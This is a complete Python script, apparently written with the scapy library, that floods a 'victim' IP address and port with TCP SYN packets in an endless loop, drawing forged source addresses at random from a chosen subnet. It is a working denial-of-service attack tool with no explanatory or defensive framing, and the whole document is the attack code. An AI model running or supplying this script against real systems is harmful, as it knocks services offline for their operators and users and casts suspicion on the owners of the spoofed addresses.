from scapy.all import *
import sys
import ipaddress
import random

target_ip   = sys.argv[1]       #Victim's IP
target_port = int(sys.argv[2])  #Victim's open port
spoofed_subnet = sys.argv[3]    #Subnet to Spoof

network = ipaddress.IPv4Network(spoofed_subnet, strict=False)
ip_list = [str(ip) for ip in network.hosts()]  # excludes .0 and .255

print(f'Flooding {target_ip} with SYN packets...')
while True:
    spoofed_ip = random.choice(ip_list)
    random.choice(ip_list)
    ip  = IP(dst=target_ip, src=spoofed_ip)
    tcp = TCP(dport=target_port, flags="S", sport=RandShort())
    send(ip/tcp, verbose=0)
